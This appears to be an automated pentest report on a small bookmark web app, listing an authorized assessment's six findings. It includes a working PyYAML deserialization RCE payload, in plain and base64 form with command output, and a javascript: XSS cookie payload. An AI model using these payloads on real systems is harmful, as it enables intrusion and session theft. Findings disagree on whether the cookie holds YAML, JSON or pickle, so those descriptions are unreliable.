# VERDICT Security Assessment Report

## Contents

- [Assessment Information](#assessment-information)
- [Scope](#scope)
- [Summary](#summary)
- [Findings](#findings)
    - [1. CRITICAL — rce Critical RCE via Python YAML unsafe deserialization in bookmarks cookie](#finding-1)
    - [2. MEDIUM — xss-reflected XSS via javascript: URI injection through bookmarks cookie](#finding-2)
    - [3. MEDIUM — misconfig Session cookie issued without HttpOnly, Secure, or SameSite flags](#finding-3)
    - [4. MEDIUM — csrf CSRF via GET-based bookmark delete (no CSRF token, SameSite=Lax)](#finding-4)
    - [5. INFO — info-disclosure Server version disclosed in Apache error page bodies](#finding-5)
    - [6. INFO — headers Missing security response headers across all endpoints](#finding-6)

## Assessment Information

| | |
|---|---|
| Assessment ID | `a-mqz0b2jf-f0uxvm` |
| Target | http://target.local:32860/ |
| Started | 2026-06-29T09:19:43.817Z |
| Generated | 2026-07-02T00:00:00.000Z |
| Phase | report |
| Screens | 7 mapped · 7 scanned · 0 remaining |
| Hypotheses | 0 (0 confirmed) |
| Findings | 6 |
| Tooling | VERDICT |

## Scope

- **In-scope hosts**: `target.local:32860`
- **Out-of-scope hosts**: —
- **In-scope paths**: `/`
- **Out-of-scope paths**: —
- **Rate**: 30 req/min, max 2 concurrent

## Summary

6 finding(s): 1 critical, 3 medium, 2 info

## Findings

<a id="finding-1"></a>

### 1. [CRITICAL] [rce] Critical RCE via Python YAML unsafe deserialization in bookmarks cookie

- Screen: `s-0004`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32860/

The application stores bookmark data in a client-side `bookmarks` cookie as base64-encoded PyYAML YAML. On GET /list the server base64-decodes the cookie and passes it to `yaml.load()` (the unsafe loader). Because `yaml.load()` honours `!!python/object/apply:` tags, an attacker who crafts a malicious cookie value can execute arbitrary Python callables at deserialization time. Demonstrated by injecting `!!python/object/apply:subprocess.getoutput [id]` as the `name` attribute of a `!!python/object:app.models.UrlObj` item; the server executed `id` and returned its output (`uid=33(www-data) gid=33(www-data) groups=33(www-data)`) in the HTML response. The `bookmarks` cookie has no HttpOnly flag, is writable by the attacker directly, and there is no signature/HMAC protecting its value. A `user` session cookie must also be present for the server to process the bookmarks cookie, but any valid user session suffices (including a freshly created one from GET /list).

**Reproduction**

```
1. Visit GET /list to obtain a `user` session cookie.\n2. Craft the following YAML payload (base64-encoded):\n   ```yaml\n   - !!python/object:app.models.UrlObj\n     name: !!python/object/apply:subprocess.getoutput [id]\n     url: http://example.com\n   ```\n   Base64: `LSAhIXB5dGhvbi9vYmplY3Q6YXBwLm1vZGVscy5VcmxPYmoKICBuYW1lOiAhIXB5dGhvbi9vYmplY3QvYXBwbHk6c3VicHJvY2Vzcy5nZXRvdXRwdXQgW2lkXQogIHVybDogaHR0cDovL2V4YW1wbGUuY29tCg==`\n3. GET /list with Cookie: user=&lt;session&gt;; bookmarks=&lt;above base64&gt;\n4. Observe the HTML response: the `id` command output appears as the bookmark name in the list.
```

**Evidence**

- Evidence `ev-mqz1rgtv-2a` — `artifacts/s-0004/ev-mqz1rgtv-2a/`

Request:

```http
GET /list HTTP/1.1
Host: target.local:32860
user-agent: verdict-scanner/0.1
x-verdict: assessment
Cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
cache-control: public, max-age=0
connection: Keep-Alive
content-length: 1824
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 10:00:28 GMT
expires: 0
keep-alive: timeout=5, max=99
pragma: no-cache
server: Apache/2.4.67 (Debian)
vary: Accept-Encoding

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Home</title>
    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="/static/css/style.css">
</head>
<body>
    <div class="container">
        <div class="row justify-content-between mt-5">
            <div class="col-md-9">
                <h2>Welcome!</h2>
                <p>Here you can check the status of your bookmarked URLs</p>
            </div>
            <div class="col-md-3">
                <div class="card">
                    <div class="card-body">
                        <h5 class="card-title">Navigation</h5>
                        <ul class="list-group">
                            <li class="list-group-item"><a href="#">Home</a></li>
                            <li class="list-group-item"><a href="/add">Bookmark URL</a></li>
                            <li class="list-group-item"><a href="/about">About us</a></li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="container mt-5">
        
        <h3 class="mb-4">List of URLs in your bookmark.</h3>
        
        <ul class="list-group">
            
                <li class="list-group-item d-flex justify-content-between align-items-center">
                    <h5 class="mb-1"></h5>
                    <a class="text-decoration-none" href="" target="_blank"></a>
                    <a class="btn btn-sm btn-danger" href="delete?name=" target="_blank">delete</a>
                </li>
            
        </ul>
    </div>

    <!-- Bootstrap Bundle with Popper -->
    <script src="/static/js/bootstrap.bundle.min.js"></script>
</body>
</html>
```

- Evidence `ev-mqz1rfin-29` — `artifacts/s-0004/ev-mqz1rfin-29/`

Request:

```http
GET /list HTTP/1.1
Host: target.local:32860
user-agent: verdict-scanner/0.1
x-verdict: assessment
Cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
cache-control: public, max-age=0
connection: Keep-Alive
content-length: 1966
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 10:00:26 GMT
expires: 0
keep-alive: timeout=5, max=100
pragma: no-cache
server: Apache/2.4.67 (Debian)
vary: Accept-Encoding

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Home</title>
    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="/static/css/style.css">
</head>
<body>
    <div class="container">
        <div class="row justify-content-between mt-5">
            <div class="col-md-9">
                <h2>Welcome!</h2>
                <p>Here you can check the status of your bookmarked URLs</p>
            </div>
            <div class="col-md-3">
                <div class="card">
                    <div class="card-body">
                        <h5 class="card-title">Navigation</h5>
                        <ul class="list-group">
                            <li class="list-group-item"><a href="#">Home</a></li>
                            <li class="list-group-item"><a href="/add">Bookmark URL</a></li>
                            <li class="list-group-item"><a href="/about">About us</a></li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="container mt-5">
        
        <h3 class="mb-4">List of URLs in your bookmark.</h3>
        
        <ul class="list-group">
            
                <li class="list-group-item d-flex justify-content-between align-items-center">
                    <h5 class="mb-1">uid=33(www-data) gid=33(www-data) groups=33(www-data)</h5>
                    <a class="text-decoration-none" href="http://example.com" target="_blank">http://example.com</a>
                    <a class="btn btn-sm btn-danger" href="delete?name=uid=33(www-data) gid=33(www-data) groups=33(www-data)" target="_blank">delete</a>
                </li>
            
        </ul>
    </div>

    <!-- Bootstrap Bundle with Popper -->
    <script src="/static/js/bootstrap.bundle.min.js"></script>
</body>
</html>
```

- Evidence `ev-mqz1s1f0-2b` — `artifacts/s-0004/ev-mqz1s1f0-2b/`

Request:

```http
GET /list HTTP/1.1
Host: target.local:32860
user-agent: verdict-scanner/0.1
x-verdict: assessment
Cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
cache-control: public, max-age=0
connection: Keep-Alive
content-length: 1966
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 10:00:54 GMT
expires: 0
keep-alive: timeout=5, max=100
pragma: no-cache
server: Apache/2.4.67 (Debian)
vary: Accept-Encoding

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Home</title>
    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="/static/css/style.css">
</head>
<body>
    <div class="container">
        <div class="row justify-content-between mt-5">
            <div class="col-md-9">
                <h2>Welcome!</h2>
                <p>Here you can check the status of your bookmarked URLs</p>
            </div>
            <div class="col-md-3">
                <div class="card">
                    <div class="card-body">
                        <h5 class="card-title">Navigation</h5>
                        <ul class="list-group">
                            <li class="list-group-item"><a href="#">Home</a></li>
                            <li class="list-group-item"><a href="/add">Bookmark URL</a></li>
                            <li class="list-group-item"><a href="/about">About us</a></li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="container mt-5">
        
        <h3 class="mb-4">List of URLs in your bookmark.</h3>
        
        <ul class="list-group">
            
                <li class="list-group-item d-flex justify-content-between align-items-center">
                    <h5 class="mb-1">uid=33(www-data) gid=33(www-data) groups=33(www-data)</h5>
                    <a class="text-decoration-none" href="http://example.com" target="_blank">http://example.com</a>
                    <a class="btn btn-sm btn-danger" href="delete?name=uid=33(www-data) gid=33(www-data) groups=33(www-data)" target="_blank">delete</a>
                </li>
            
        </ul>
    </div>

    <!-- Bootstrap Bundle with Popper -->
    <script src="/static/js/bootstrap.bundle.min.js"></script>
</body>
</html>
```

<a id="finding-2"></a>

### 2. [MEDIUM] [xss-reflected] XSS via javascript: URI injection through bookmarks cookie

- Screen: `s-0001`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32860/

The /list page reads the client-supplied `bookmarks` cookie (base64-encoded JSON array of URLs), decodes it, and renders each URL directly into an HTML `href` attribute without filtering the `javascript:` URI scheme. An attacker who can manipulate the victim's `bookmarks` cookie (e.g., via a chain with another XSS, MITM on plain HTTP, or if the /add endpoint permits javascript: bookmarks) can plant a `javascript:alert(1)` link. When the victim visits /list and clicks that bookmark, the script executes in their browser. Angle-bracket HTML entities are escaped (so `<script>` tags are blocked), but `javascript:` URIs pass through unmodified into the `href="javascript:alert(1)"` attribute.

**Reproduction**

```
1. Obtain or craft the base64 value: base64('[{"url":"javascript:alert(1)"}]\n') = W3sidXJsIjoiamF2YXNjcmlwdDphbGVydCgxKSJ9XQo=
2. Send: GET /list with cookies: user=<valid_session>; bookmarks=W3sidXJsIjoiamF2YXNjcmlwdDphbGVydCgxKSJ9XQo=
3. Observe HTML response contains: href="javascript:alert(1)"
4. A victim clicking that link executes the JavaScript.
```

**Evidence**

- Evidence `ev-mqz0hj5c-n` — `artifacts/s-0001/ev-mqz0hj5c-n/`

Request:

```http
GET /list HTTP/1.1
Host: target.local:32860
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
cache-control: public, max-age=0
connection: Keep-Alive
content-length: 1870
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 09:24:44 GMT
expires: 0
keep-alive: timeout=5, max=100
pragma: no-cache
server: Apache/2.4.67 (Debian)
vary: Accept-Encoding

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Home</title>
    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="/static/css/style.css">
</head>
<body>
    <div class="container">
        <div class="row justify-content-between mt-5">
            <div class="col-md-9">
                <h2>Welcome!</h2>
                <p>Here you can check the status of your bookmarked URLs</p>
            </div>
            <div class="col-md-3">
                <div class="card">
                    <div class="card-body">
                        <h5 class="card-title">Navigation</h5>
                        <ul class="list-group">
                            <li class="list-group-item"><a href="#">Home</a></li>
                            <li class="list-group-item"><a href="/add">Bookmark URL</a></li>
                            <li class="list-group-item"><a href="/about">About us</a></li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="container mt-5">
        
        <h3 class="mb-4">List of URLs in your bookmark.</h3>
        
        <ul class="list-group">
            
                <li class="list-group-item d-flex justify-content-between align-items-center">
                    <h5 class="mb-1"></h5>
                    <a class="text-decoration-none" href="http://veritas-test.com" target="_blank">http://veritas-test.com</a>
                    <a class="btn btn-sm btn-danger" href="delete?name=" target="_blank">delete</a>
                </li>
            
        </ul>
    </div>

    <!-- Bootstrap Bundle with Popper -->
    <script src="/static/js/bootstrap.bundle.min.js"></script>
</body>
</html>
```

- Evidence `ev-mqz0j17s-p` — `artifacts/s-0001/ev-mqz0j17s-p/`

Request:

```http
GET /list HTTP/1.1
Host: target.local:32860
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
cache-control: public, max-age=0
connection: Keep-Alive
content-length: 1862
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 09:25:54 GMT
expires: 0
keep-alive: timeout=5, max=100
pragma: no-cache
server: Apache/2.4.67 (Debian)
vary: Accept-Encoding

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Home</title>
    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="/static/css/style.css">
</head>
<body>
    <div class="container">
        <div class="row justify-content-between mt-5">
            <div class="col-md-9">
                <h2>Welcome!</h2>
                <p>Here you can check the status of your bookmarked URLs</p>
            </div>
            <div class="col-md-3">
                <div class="card">
                    <div class="card-body">
                        <h5 class="card-title">Navigation</h5>
                        <ul class="list-group">
                            <li class="list-group-item"><a href="#">Home</a></li>
                            <li class="list-group-item"><a href="/add">Bookmark URL</a></li>
                            <li class="list-group-item"><a href="/about">About us</a></li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="container mt-5">
        
        <h3 class="mb-4">List of URLs in your bookmark.</h3>
        
        <ul class="list-group">
            
                <li class="list-group-item d-flex justify-content-between align-items-center">
                    <h5 class="mb-1"></h5>
                    <a class="text-decoration-none" href="javascript:alert(1)" target="_blank">javascript:alert(1)</a>
                    <a class="btn btn-sm btn-danger" href="delete?name=" target="_blank">delete</a>
                </li>
            
        </ul>
    </div>

    <!-- Bootstrap Bundle with Popper -->
    <script src="/static/js/bootstrap.bundle.min.js"></script>
</body>
</html>
```

- Evidence `ev-mqz0k2ry-q` — `artifacts/s-0001/ev-mqz0k2ry-q/`

Request:

```http
GET /list HTTP/1.1
Host: target.local:32860
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
```

Response:

```http
HTTP/1.1 200
cache-control: public, max-age=0
connection: Keep-Alive
content-length: 1862
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 09:26:43 GMT
expires: 0
keep-alive: timeout=5, max=100
pragma: no-cache
server: Apache/2.4.67 (Debian)
vary: Accept-Encoding

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Home</title>
    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="/static/css/style.css">
</head>
<body>
    <div class="container">
        <div class="row justify-content-between mt-5">
            <div class="col-md-9">
                <h2>Welcome!</h2>
                <p>Here you can check the status of your bookmarked URLs</p>
            </div>
            <div class="col-md-3">
                <div class="card">
                    <div class="card-body">
                        <h5 class="card-title">Navigation</h5>
                        <ul class="list-group">
                            <li class="list-group-item"><a href="#">Home</a></li>
                            <li class="list-group-item"><a href="/add">Bookmark URL</a></li>
                            <li class="list-group-item"><a href="/about">About us</a></li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="container mt-5">
        
        <h3 class="mb-4">List of URLs in your bookmark.</h3>
        
        <ul class="list-group">
            
                <li class="list-group-item d-flex justify-content-between align-items-center">
                    <h5 class="mb-1"></h5>
                    <a class="text-decoration-none" href="javascript:alert(1)" target="_blank">javascript:alert(1)</a>
                    <a class="btn btn-sm btn-danger" href="delete?name=" target="_blank">delete</a>
                </li>
            
        </ul>
    </div>

    <!-- Bootstrap Bundle with Popper -->
    <script src="/static/js/bootstrap.bundle.min.js"></script>
</body>
</html>
```

<a id="finding-3"></a>

### 3. [MEDIUM] [misconfig] Session cookie issued without HttpOnly, Secure, or SameSite flags

- Screen: `s-0006`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32860/

Every visit to `/list` (and likely all other app pages) issues a new `user` session cookie with only `Path=/` set — no `HttpOnly`, no `Secure`, and no explicit `SameSite` attribute. The `bookmarks` cookie (which contains serialised Python pickle data) is also set without `HttpOnly`. Absence of `HttpOnly` means any JavaScript executing in the page origin (e.g. via the already-confirmed reflected XSS on `/list`) can exfiltrate both cookies with `document.cookie`, enabling full session takeover. Absence of `Secure` allows transmission over plaintext HTTP. The missing explicit `SameSite` defaults to `Lax` in modern browsers, which protects POST-form CSRF but not cross-site GET-navigation attacks — relevant because the `/delete` endpoint performs its state change via a bare GET request.

**Reproduction**

```
1. Send GET /list with no cookie header.\n2. Observe the response: `Set-Cookie: user=<hex>; Path=/` — no HttpOnly, Secure, or SameSite attributes.\n3. Repeat to confirm reproducibility.\n4. Contrast with a static asset response (e.g. /static/css/bootstrap.min.css) which sets no cookie at all, confirming the behaviour is specific to session-issuing endpoints.
```

**Evidence**

- Evidence `ev-mqz24j2e-2r` — `artifacts/s-0006/ev-mqz24j2e-2r/`

Request:

```http
GET /static/css/bootstrap.min.css HTTP/1.1
Host: target.local:32860
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response (truncated):

```http
HTTP/1.1 200
accept-ranges: bytes
access-control-allow-origin: *
connection: Keep-Alive
content-length: 220780
content-type: text/css
date: Mon, 29 Jun 2026 10:10:37 GMT
etag: "35e6c-6553e04418500-gzip"
keep-alive: timeout=5, max=100
last-modified: Sat, 27 Jun 2026 15:38:28 GMT
server: Apache/2.4.67 (Debian)
vary: Accept-Encoding

@charset "UTF-8";/*!
 * Bootstrap  v5.3.0-alpha1 (https://getbootstrap.com/)
 * Copyright 2011-2022 The Bootstrap Authors
 * Licensed under MIT (https://github.com/twbs/bootstrap/blob/main/LICENSE)
 */:root,[data-bs-theme=light]{--bs-blue:#0d6efd;--bs-indigo:#6610f2;--bs-purple:#6f42c1;--bs-pink:#d63384;--bs-red:#dc3545;--bs-orange:#fd7e14;--bs-yellow:#ffc107;--bs-green:#198754;--bs-teal:#20c997;--bs-cyan:#0dcaf0;--bs-black:#000;--bs-white:#fff;--bs-gray:#6c757d;--bs-gray-dark:#343a40;--bs-gray-100:#f8f9fa;--bs-gray-200:#e9ecef;--bs-gray-300:#dee2e6;--bs-gray-400:#ced4da;--bs-gray-500:#adb5bd;--bs-gray-600:#6c757d;--bs-gray-700:#495057;--bs-gray-800:#343a40;--bs-gray-900:#212529;--bs-primary:#0d6efd;--bs-secondary:#6c757d;--bs-success:#198754;--bs-info:#0dcaf0;--bs-warning:#ffc107;--bs-danger:#dc3545;--bs-light:#f8f9fa;--bs-dark:#212529;--bs-primary-rgb:13,110,253;--bs-secondary-rgb:108,117,125;--bs-success-rgb:25,135,84;--bs-info-rgb:13,202,240;--bs-warning-rgb:255,193,7;--bs-danger-rgb:220,53,69;--bs-light-rgb:248,249,250;--bs-dark-rgb:33,37,41;--bs-primary-text:#0a58ca;--bs-secondary-text:#6c757d;--bs-success-text:#146c43;--bs-info-text:#087990;--bs-warning-text:#997404;--bs-danger-text:#b02a37;--bs-light-text:#6c757d;--bs-dark-text:#495057;--bs-primary-bg-subtle:#cfe2ff;--bs-secondary-bg-subtle:#f8f9fa;--bs-success-bg-subtle:#d1e7dd;--bs-info-bg-subtle:#cff4fc;--bs-warning-bg-subtle:#fff3cd;--bs-danger-bg-subtle:#f8d7da;--bs-light-bg-subtle:#fcfcfd;--bs-dark-bg-subtle:#ced4da;--bs-primary-border-subtle:#9ec5fe;--bs-secondary-border-subtle:#e9ecef;--bs-success-border-subtle:#a3cfbb;--bs-info-border-subtle:#9eeaf9;--bs-warning-border-subtle:#ffe69c;--bs-danger-border-subtle:#f1aeb5;--bs-light-border-subtle:#e9ecef;--bs-dark-border-subtle:#adb5bd;--bs-white-rgb:255,255,255;--bs-black-rgb:0,0,0;--bs-body-color-rgb:33,37,41;--bs-body-bg-rgb:255,255,255;--bs-font-sans-serif:system-ui,-apple-system,"Segoe UI",Roboto,"Helvetica Neue","Noto Sans","Liberation Sans",Arial,sans-serif,"Apple Color Emoji","Segoe UI Emoji","Segoe UI Symbol","Noto Color Emoji";--bs-font-monospace:SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace;--bs-gradient:linear-gradient(180deg, rgba(255, 255, 255, 0.15), rgba(255, 255, 255, 0));--bs-body-font-family:var(--bs-font-sans-serif);--bs-body-font-size:1rem;--bs-body-font-weight:400;--bs-body-line-height:1.5;--bs-body-color:#212529;--bs-emphasis-color:#000;--bs-emphasis-color-rgb:0,0,0;--bs-secondary-color:rgba(33, 37, 41, 0.75);--bs-secondary-color-rgb:33,37,41;--bs-secondary-bg:#e9ecef;--bs-secondary-bg-rgb:233,236,239;--bs-tertiary-color:rgba(33, 37, 41, 0.5);--bs-tertiary-color-rgb:33,37,41;--bs-tertiary-bg:#f8f9fa;--bs-tertiary-bg-rgb:248,249,250;--bs-body-bg:#fff;--bs-body-bg-rgb:255,255,255;--bs-link-color:#0d6efd;--bs-link-color-rgb:13,110,253;--bs-link-decoration:underline;--bs-link-hover-color:#0a58ca;--bs-link-hover-color-rgb:10,88,202;--bs-code-color:#d63384;--bs-highlight-bg:#fff3cd;--bs-border-width:1px;--bs-border-style:solid;--bs-border-color:#dee2e6;--bs-border-color-translucent:rgba(0, 0, 0, 0.175);--bs-border-radius:0.375rem;--bs-border-radius-sm:0.25rem;--bs-border-radius-lg:0.5rem;--bs-border-radius-xl:1rem;--bs-border-radius-2xl:2rem;--bs-border-radius-pill:50rem;--bs-box-shadow:0 0.5rem 1rem rgba(var(--bs-body-color-rgb), 0.15);--bs-box-shadow-sm:0 0.125rem 0.25rem rgba(var(--bs-body-color-rgb), 0.075);--bs-box-shadow-lg:0 1rem 3rem rgba(var(--bs-body-color-rgb), 0.175);--bs-box-shadow-inset:inset 0 1px 2px rgba(var(--bs-body-color-rgb), 0.075);--bs-emphasis-color:#000;--bs-form-control-bg:var(--bs-body-bg);--bs-form-control-disabled-bg:var(--bs-secondary-bg);--bs-highlight-bg:#fff3cd;--bs-breakpoint-xs:0;--bs-breakpoint-sm:576px;--bs-breakpoint-md:768px;--bs-breakpoint-lg:992px;--bs-breakpoint-xl:1200px;--bs-breakpoint-xxl:1400px}[data-bs-theme=dark]{--bs-body-color:#adb5bd;--bs-body-color-rgb:173,181,189;--bs-body-bg:#212529;--bs-body-bg-rgb:33,37,41;--bs-emphasis-color:#f8f9fa;--bs-emphasis-color-rgb:248,249,250;--bs-secondary-color:rgba(173, 181, 189, 0.75);--bs-secondary-color-rgb:173,181,189;--bs-secondary-bg:#343a40;--bs-secondary-bg-rgb:52,58,64;--bs-tertiary-color:rgba(173, 181, 189, 0.5);--bs-tertiary-color-rgb:173,181,189;--bs-tertiary-bg:#2b3035;--bs-tertiary-bg-rgb:43,48,53;--bs-emphasis-color:#fff;--bs-primary-text:#6ea8fe;--bs-secondary-text:#dee2e6;--bs-success-text:#75b798;--bs-info-text:#6edff6;--bs-warning-text:#ffda6a;--bs-danger-text:#ea868f;--bs-light-text:#f8f9fa;--bs-dark-text:#dee2e6;--bs-primary-bg-subtle:#031633;--bs-secondary-bg-subtle:#212529;--bs-success-bg-subtle:#051b11;--bs-info-bg-subtle:#032830;--bs-warning-bg-subtle:#332701;--bs-danger-bg-subtle:#2c0b0e;--bs-light-bg-subtle:#343a40;--bs-dark-bg-subtle:#1a1d20;--bs-primary-border-subtle:#084298;--bs-secondary-border-subtle:#495057;--bs-success-border-subtle:#0f5132;--bs-info-border-subtle:#055160;--bs-warning-border-subtle:#664d03;--bs-danger-border-subtle:#842029;--bs-light-border-subtle:#495057;--bs-dark-border-subtle:#343a40;--bs-heading-color:#fff;--bs-link-color:#6ea8fe;--bs-link-hover-color:#9ec5fe;--bs-link-color-rgb:110,168,254;--bs-link-hover-color-rgb:158,197,254;--bs-code-color:#e685b5;--bs-border-color:#495057;--bs-border-color-translucent:rgba(255, 255, 255, 0.15)}*,::after,::before{box-sizing:border-box}@media (prefers-reduced-motion:no-preference){:root{scroll-behavior:smooth}}body{margin:0;font-family:var(--bs-body-font-family);font-size:var(--bs-body-font-size);font-weight:var(--bs-body-font-weight);line-height:var(--bs-body-line-height);color:var(--bs-body-color);text-align:var(--bs-body-text-align);background-color:var(--bs-body-bg);-webkit-text-size-adjust:100%;-webkit-tap-highlight-color:transparent}hr{margin:1rem 0;color:inherit;border:0;border-top:var(--bs-border-width) solid;opacity:.25}.h1,.h2,.h3,.h4,.h5,.h6,h1,h2,h3,h4,h5,h6{margin-top:0;margin-bottom:.5rem;font-weight:500;line-height:1.2;color:var(--bs-heading-color,inherit)}.h1,h1{font-size:calc(1.375rem + 1.5vw)}@media (min-width:1200px){.h1,h1{font-size:2.5rem}}.h2,h2{font-size:calc(1.325rem + .9vw)}@media (min-width:1200px){.h2,h2{font-size:2rem}}.h3,h3{font-size:calc(1.3rem + .6vw)}@media (min-width:1200px){.h3,h3{font-size:1.75rem}}.h4,h4{font-size:calc(1.275rem + .3vw)}@media (min-width:1200px){.h4,h4{font-size:1.5rem}}.h5,h5{font-size:1.25rem}.h6,h6{font-size:1rem}p{margin-top:0;margin-bottom:1rem}abbr[title]{-webkit-text-decoration:underline dotted;text-decoration:underline dotted;cursor:help;-webkit-text-decoration-skip-ink:none;text-decoration-skip-ink:none}address{margin-bottom:1rem;font-style:normal;line-height:inherit}ol,ul{padding-left:2rem}dl,ol,ul{margin-top:0;margin-bottom:1rem}ol ol,ol ul,ul ol,ul ul{margin-bottom:0}dt{font-weight:700}dd{margin-bottom:.5rem;margin-left:0}blockquote{margin:0 0 1rem}b,strong{font-weight:bolder}.small,small{font-size:.875em}.mark,mark{padding:.1875em;background-color:var(--bs-highlight-bg)}sub,sup{position:relative;font-size:.75em;line-height:0;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}a{color:rgba(var(--bs-link-color-rgb),var(--bs-link-opacity,1));text-decoration:underline}a:hover{--bs-link-color-rgb:var(--bs-link-hover-color-rgb)}a:not([href]):not([class]),a:not([href]):not([class]):hover{color:inherit;text-decoration:none}code,kbd,pre,samp{font-family:var(--bs-font-monospace);font-size:1em}pre{display:block;margin-top:0;margin-bottom:1rem;overflow:auto;font-size:.875em}pre code{font-size:inherit;color:inherit;word-break:normal}code{font-size:.875em;color:var(--bs-code-color);word-wrap:break-word}a>code{color:inherit}kbd{padding:.1875rem .375rem;font-size:.875em;color:var(--bs-body-bg);background-color:var(--bs-body-color);border-radius:.25rem}kbd kbd{padding:0;font-size:1em}figure{margin:0 0 1rem}img,svg{vertical-align:middle}table{caption-side:bottom;border-collapse:collapse}caption{padding-top:.5rem;padding-bottom:.5rem;color:var(--bs-secondary-color);text-align:left}th{text-align:inherit;text-align:-webkit-match-parent}tbody,td,tfoot,th,thead,tr{border-color:inherit;border-style:solid;border-width:0}label{display:inline-block}button{border-radius:0}button:focus:not(:focus-visible){outline:0}button,input,optgroup,select,textarea{margin:0;font-family:inherit;font-size:inherit;line-height:inherit}button,select{text-transform:none}[role=button]{cursor:pointer}select{word-wrap:normal}select:disabled{opacity:1}[list]:not([type=date]):not([type=datetime-local]):not([type=month]):not([type=week]):not([type=time])::-webkit-calendar-picker-indicator{display:none!important}[type=button],[type=reset],[type=submit],button{-webkit-appearance:button}[type=button]:not(:disabled),[type=reset]:not(:disabled),[type=submit]:not(:disabled),button:not(:disabled){cursor:pointer}::-moz-focus-inner{padding:0;border-style:none}textarea{resize:vertical}fieldset{min-width:0;padding:0;margin:0;border:0}legend{float:left;width:100%;padding:0;margin-bottom:.5rem;font-size:calc(1.275rem + .3vw);line-height:inherit}@media (min-width:1200px){legend{font-size:1.5rem}}legend+*{clear:left}::-webkit-datetime-edit-day-field,::-webkit-datetime-edit-fields-wrapper,::-webkit-datetime-edit-hour-field,::-webkit-datetime-edit-minute,::-webkit-datetime-edit-month-field,::-webkit-datetime-edit-text,::-webkit-datetime-edit-year-field{padding:0}::-webkit-inner-spin-button{height:auto}[type=search]{outline-offset:-2px;-webkit-appearance:textfield}::-webkit-search-decoration{-webkit-appearance:none}::-webkit-color-swatch-wrapper{padding:0}::-webkit-file-upload-button{font:inherit;-webkit-appearance:button}::file-selector-button{font:inherit;-webkit-appearance:button}output{display:inline-block}iframe{border:0}summary{display:list-item;cursor:pointer}progress{vertical-align:baseline}[hidden]{display:none!important}.lead{font-size:1.25rem;font-weight:300}.display-1{font-size:calc(1.625rem + 4.5vw);font-weight:300;line-height:1.2}@media (min-width:1200px){.display-1{font-size:5rem}}.display-2{font-size:calc(1.575rem + 3.9vw);font-weight:300;line-height:1.2}@media (min-width:1200px){.display-2{font-size:4.5rem}}.display-3{font-size:calc(1.525rem + 3.3vw);font-weight:300;line-height:1.2}@media (min-width:1200px){.display-3{font-size:4rem}}.display-4{font-size:calc(1.475rem + 2.7vw);font-weight:300;line-height:1.2}@media (min-width:1200px){.display-4{font-size:3.5rem}}.display-5{font-size:calc(1.425rem + 2.1vw);font-weight:300;line-height:1.2}@media (min-width:1200px){.display-5{font-size:3rem}}.display-6{font-size:calc(1.375rem + 1.5vw);font-weight:300;line-height:1.2}@media (min-width:1200px){.display-6{font-size:2.5rem}}.list-unstyled{padding-left:0;list-style:none}.list-inline{padding-left:0;list-style:none}.list-inline-item{display:inline-block}.list-inline-item:not(:last-child){margin-right:.5rem}.initialism{font-size:.875em;text-transform:uppercase}.blockquote{margin-bottom:1rem;font-size:1.25rem}.blockquote>:last-child{margin-bottom:0}.blockquote-footer{margin-top:-1rem;margin-bottom:1rem;font-size:.875em;color:#6c757d}.blockquote-footer::before{content:"— "}.img-fluid{max-width:100%;height:auto}.img-thumbnail{padding:.25rem;background-color:var(--bs-body-bg);border:var(--bs-border-width) solid 